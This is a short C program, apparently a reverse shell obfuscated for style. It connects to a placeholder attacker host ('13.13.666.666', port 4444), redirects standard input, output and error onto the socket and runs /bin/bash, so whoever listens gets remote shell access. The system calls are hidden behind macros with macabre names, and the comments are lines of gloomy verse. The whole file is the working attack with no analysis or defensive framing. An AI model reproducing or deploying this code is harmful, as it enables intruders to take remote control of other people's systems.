#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define LHOST "13.13.666.666"
#define LPORT 4444

#define NIGHTMARE main
#define BOTTOMLESS_PIT socket
#define SLY_VAMPIRE htons
#define SACRIFICE inet_addr
#define SORROW connect
#define DOOM dup2
#define CEMETERY close
#define SUMMON execve

// good night
int NIGHTMARE(void) {
    
    int sockfd;
    struct sockaddr_in reaper;

    // deep inside my darkness
    sockfd = BOTTOMLESS_PIT(AF_INET, SOCK_STREAM, 0);
    reaper.sin_family = AF_INET;
    reaper.sin_port = SLY_VAMPIRE(LPORT);
    reaper.sin_addr.s_addr = SACRIFICE(LHOST);

    SORROW(sockfd, (struct sockaddr*)&reaper, sizeof(reaper));

    DOOM(sockfd, 0);
    DOOM(sockfd, 1);
    DOOM(sockfd, 2);

    // it was there
    CEMETERY(sockfd);

    // i try to wake myself up
    char *argv[] = {"/bin/bash", NULL};
    SUMMON(argv[0], argv, NULL);

    // sigh
    return 0;

}
